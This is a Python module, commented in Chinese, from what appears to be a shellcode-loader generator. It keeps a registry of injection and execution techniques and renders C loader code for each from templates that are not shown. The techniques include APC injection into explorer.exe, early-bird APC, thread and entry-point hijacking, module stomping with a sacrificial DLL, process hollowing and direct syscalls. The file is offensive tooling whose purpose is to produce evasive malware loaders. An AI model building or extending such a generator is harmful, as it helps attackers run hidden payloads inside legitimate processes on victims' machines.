"""
加载方式注册表：使用装饰器模式动态注册加载方式实现，替代冗长的 if-elif 分支。
现在使用模板渲染生成代码，而不是硬编码字符串。
"""
from typing import Dict, Callable, Optional, Any
from functools import wraps
from template_renderer import TemplateRenderer


class LoadMethodRegistry:
    """加载方式注册表"""
    _methods: Dict[str, Callable[..., str]] = {}
    _descriptions: Dict[str, str] = {}
    
    @classmethod
    def register(cls, name: str, description: str = ""):
        """注册加载方式装饰器"""
        def decorator(func: Callable[..., str]):
            cls._methods[name] = func
            cls._descriptions[name] = description or func.__doc__ or ""
            
            @wraps(func)
            def wrapper(*args, **kwargs):
                return func(*args, **kwargs)
            return wrapper
        return decorator
    
    @classmethod
    def get(cls, name: str) -> Optional[Callable[..., str]]:
        """获取加载方式实现函数"""
        return cls._methods.get(name)
    
    @classmethod
    def get_description(cls, name: str) -> str:
        """获取加载方式描述"""
        return cls._descriptions.get(name, "")
    
    @classmethod
    def list_all(cls) -> Dict[str, str]:
        """返回所有注册的加载方式及其描述"""
        return {name: cls._descriptions[name] for name in cls._methods}
    
    @classmethod
    def supports_arch(cls, name: str, arch: str) -> bool:
        """检查加载方式是否支持指定架构"""
        func = cls._methods.get(name)
        if not func:
            return False
        # 如果函数有 supports_arch 属性，使用它
        if hasattr(func, 'supports_arch'):
            return func.supports_arch(arch)
        # 默认假设支持所有架构
        return True
    
    @classmethod
    def generate(cls, name: str, **kwargs) -> str:
        """生成指定加载方式的代码"""
        func = cls.get(name)
        if not func:
            raise ValueError(f"未注册的加载方式: {name}")
        return func(**kwargs)


# 全局注册表实例
registry = LoadMethodRegistry()


# 辅助装饰器，用于标记架构支持
def arch_support(x86: bool = True, x64: bool = True):
    """装饰器，用于标记函数支持的架构"""
    def decorator(func):
        func.supports_arch = lambda arch: (arch == 'x86' and x86) or (arch == 'x64' and x64)
        return func
    return decorator


# 模板渲染器实例
_renderer = None

def get_renderer():
    """获取模板渲染器实例"""
    global _renderer
    if _renderer is None:
        _renderer = TemplateRenderer()
    return _renderer

# 模板文件映射
TEMPLATE_MAPPING = {
    "CreateThreadpoolWait Load": "load_methods/create_threadpoolwait_load.c.j2",
    "Dynamic Load": "load_methods/dynamic_load.c.j2",
    "Dynamic Load plus": "load_methods/dynamic_load_plus.c.j2",
    "Fiber Load": "load_methods/fiber_load.c.j2",
    "NtTestAlert Load": "load_methods/nttestalert_load.c.j2",
    "SEH Except Load": "load_methods/seh_except_load.c.j2",
    "TLS CallBack Load": "load_methods/tls_callback_load.c.j2",
    "Syscall Load": "load_methods/syscall_load.c.j2",
    "APC-Inject Load": "load_methods/apc_inject_load.c.j2",
    "Early Brid APC-Inject Load": "load_methods/early_brid_apc_inject_load.c.j2",
    "NtCreateSection-Inject Load": "load_methods/ntcreatesection_inject_load.c.j2",
    "OEP Hiijack-Inject Load": "load_methods/oep_hijack_inject_load.c.j2",
    "Thread Hiijack-Inject Load": "load_methods/thread_hijack_load.c.j2",
    "Module Stomp": "load_methods/module_stomp.c.j2",
    "Process Hollowing": "load_methods/process_hollowing.c.j2",
}

# 示例：注册动态加载方式（使用模板）
@registry.register("Dynamic Load", "经典动态加载：VirtualAlloc + memcpy + 直接执行")
@arch_support(x86=True, x64=True)
def generate_dynamic_load(**kwargs) -> str:
    renderer = get_renderer()
    template_vars = {
        "arch": kwargs.get('arch', 'x64'),
        "sacrificial_dll": kwargs.get('sacrificial_dll', 'C:\\Windows\\System32\\combase.dll')
    }
    return renderer.render_template("load_methods/dynamic_load.c.j2", template_vars)


# 注册纤程加载方式（使用模板）
@registry.register("Fiber Load", "纤程加载：将线程转换为纤程并执行")
@arch_support(x86=True, x64=True)
def generate_fiber_load(**kwargs) -> str:
    renderer = get_renderer()
    template_vars = {
        "arch": kwargs.get('arch', 'x64'),
        "sacrificial_dll": kwargs.get('sacrificial_dll', 'C:\\Windows\\System32\\combase.dll')
    }
    return renderer.render_template("load_methods/fiber_load.c.j2", template_vars)


# 注册 APC 注入加载方式（使用模板）
@registry.register("APC-Inject Load", "APC注入：向目标进程（explorer.exe）注入APC")
@arch_support(x86=True, x64=True)
def generate_apc_inject(**kwargs) -> str:
    renderer = get_renderer()
    template_vars = {
        "arch": kwargs.get('arch', 'x64'),
        "sacrificial_dll": kwargs.get('sacrificial_dll', 'C:\\Windows\\System32\\combase.dll')
    }
    return renderer.render_template("load_methods/apc_inject_load.c.j2", template_vars)


# 注册线程劫持加载方式（使用模板）
@registry.register("Thread Hiijack-Inject Load", "线程劫持：修改现有线程上下文执行")
@arch_support(x86=True, x64=True)
def generate_thread_hijack(**kwargs) -> str:
    renderer = get_renderer()
    template_vars = {
        "arch": kwargs.get('arch', 'x64'),
        "sacrificial_dll": kwargs.get('sacrificial_dll', 'C:\\Windows\\System32\\combase.dll')
    }
    return renderer.render_template("load_methods/thread_hijack_load.c.j2", template_vars)


# 注册模块踩踏加载方式（使用模板）
@registry.register("Module Stomp", "模块踩踏：利用合法DLL的.text节区执行")
@arch_support(x86=True, x64=True)
def generate_module_stomp(**kwargs) -> str:
    renderer = get_renderer()
    template_vars = {
        "arch": kwargs.get('arch', 'x64'),
        "sacrificial_dll": kwargs.get('sacrificial_dll', 'C:\\Windows\\System32\\combase.dll')
    }
    return renderer.render_template("load_methods/module_stomp.c.j2", template_vars)


# 注册SEH异常加载方式（使用模板）
@registry.register("SEH Except Load", "SEH异常：通过访问冲突异常执行")
@arch_support(x86=True, x64=True)
def generate_seh_except(**kwargs) -> str:
    renderer = get_renderer()
    template_vars = {
        "arch": kwargs.get('arch', 'x64'),
        "sacrificial_dll": kwargs.get('sacrificial_dll', 'C:\\Windows\\System32\\combase.dll')
    }
    return renderer.render_template("load_methods/seh_except_load.c.j2", template_vars)


# 注册系统调用加载方式（使用模板）
@registry.register("Syscall Load", "系统调用：通过ntdll系统调用执行")
@arch_support(x86=True, x64=True)
def generate_syscall(**kwargs) -> str:
    renderer = get_renderer()
    template_vars = {
        "arch": kwargs.get('arch', 'x64'),
        "sacrificial_dll": kwargs.get('sacrificial_dll', 'C:\\Windows\\System32\\combase.dll')
    }
    return renderer.render_template("load_methods/syscall_load.c.j2", template_vars)


# 注册进程空洞注入加载方式（使用模板）
@registry.register("Process Hollowing", "进程空洞注入：创建挂起进程并替换内存")
@arch_support(x86=True, x64=True)
def generate_process_hollowing(**kwargs) -> str:
    renderer = get_renderer()
    template_vars = {
        "arch": kwargs.get('arch', 'x64'),
        "sacrificial_dll": kwargs.get('sacrificial_dll', 'C:\\Windows\\System32\\combase.dll')
    }
    return renderer.render_template("load_methods/process_hollowing.c.j2", template_vars)


# 注册CreateThreadpoolWait加载方式
@registry.register("CreateThreadpoolWait Load", "线程池等待：使用线程池等待对象执行")
@arch_support(x86=True, x64=True)
def generate_create_threadpoolwait(**kwargs) -> str:
    renderer = get_renderer()
    template_vars = {
        "arch": kwargs.get('arch', 'x64'),
        "sacrificial_dll": kwargs.get('sacrificial_dll', 'C:\\Windows\\System32\\combase.dll')
    }
    return renderer.render_template("load_methods/create_threadpoolwait_load.c.j2", template_vars)


# 注册动态加载增强版加载方式
@registry.register("Dynamic Load plus", "动态加载增强版：VirtualAlloc + VirtualProtect")
@arch_support(x86=True, x64=True)
def generate_dynamic_load_plus(**kwargs) -> str:
    renderer = get_renderer()
    template_vars = {
        "arch": kwargs.get('arch', 'x64'),
        "sacrificial_dll": kwargs.get('sacrificial_dll', 'C:\\Windows\\System32\\combase.dll')
    }
    return renderer.render_template("load_methods/dynamic_load_plus.c.j2", template_vars)


# 注册NtTestAlert加载方式
@registry.register("NtTestAlert Load", "NtTestAlert：使用NtTestAlert函数执行")
@arch_support(x86=True, x64=True)
def generate_nttestalert(**kwargs) -> str:
    renderer = get_renderer()
    template_vars = {
        "arch": kwargs.get('arch', 'x64'),
        "sacrificial_dll": kwargs.get('sacrificial_dll', 'C:\\Windows\\System32\\combase.dll')
    }
    return renderer.render_template("load_methods/nttestalert_load.c.j2", template_vars)


# 注册TLS回调加载方式
@registry.register("TLS CallBack Load", "TLS回调：使用TLS回调函数执行")
@arch_support(x86=True, x64=True)
def generate_tls_callback(**kwargs) -> str:
    renderer = get_renderer()
    template_vars = {
        "arch": kwargs.get('arch', 'x64'),
        "sacrificial_dll": kwargs.get('sacrificial_dll', 'C:\\Windows\\System32\\combase.dll')
    }
    return renderer.render_template("load_methods/tls_callback_load.c.j2", template_vars)


# 注册早期桥接APC注入加载方式
@registry.register("Early Brid APC-Inject Load", "早期桥接APC注入：在进程早期注入APC")
@arch_support(x86=True, x64=True)
def generate_early_brid_apc_inject(**kwargs) -> str:
    renderer = get_renderer()
    template_vars = {
        "arch": kwargs.get('arch', 'x64'),
        "sacrificial_dll": kwargs.get('sacrificial_dll', 'C:\\Windows\\System32\\combase.dll')
    }
    return renderer.render_template("load_methods/early_brid_apc_inject_load.c.j2", template_vars)


# 注册NtCreateSection注入加载方式
@registry.register("NtCreateSection-Inject Load", "NtCreateSection注入：使用NtCreateSection和映射执行")
@arch_support(x86=True, x64=True)
def generate_ntcreatesection_inject(**kwargs) -> str:
    renderer = get_renderer()
    template_vars = {
        "arch": kwargs.get('arch', 'x64'),
        "sacrificial_dll": kwargs.get('sacrificial_dll', 'C:\\Windows\\System32\\combase.dll')
    }
    return renderer.render_template("load_methods/ntcreatesection_inject_load.c.j2", template_vars)


# 注册OEP劫持注入加载方式
@registry.register("OEP Hiijack-Inject Load", "OEP劫持注入：劫持原始入口点执行")
@arch_support(x86=True, x64=True)
def generate_oep_hijack_inject(**kwargs) -> str:
    renderer = get_renderer()
    template_vars = {
        "arch": kwargs.get('arch', 'x64'),
        "sacrificial_dll": kwargs.get('sacrificial_dll', 'C:\\Windows\\System32\\combase.dll')
    }
    return renderer.render_template("load_methods/oep_hijack_inject_load.c.j2", template_vars)


# 可以继续注册其他加载方式...
# 为了简洁，这里只注册三个示例，后续可以扩展


def get_load_method_implementation(method: str, arch: str, sacrificial_dll: str, use_process_hollowing: bool) -> str:
    """兼容旧函数的包装器，现在使用模板渲染"""
    renderer = get_renderer()
    
    # 如果使用进程空洞注入，返回特殊实现
    if use_process_hollowing:
        template_vars = {
            "arch": arch,
            "sacrificial_dll": sacrificial_dll
        }
        return renderer.render_template("load_methods/process_hollowing.c.j2", template_vars)
    
    # 从注册表获取
    if registry.get(method):
        return registry.generate(method, arch=arch, sacrificial_dll=sacrificial_dll)
    
    # 回退到默认模板
    template_vars = {
        "arch": arch,
        "sacrificial_dll": sacrificial_dll
    }
    return renderer.render_template("load_methods/default_load.c.j2", template_vars)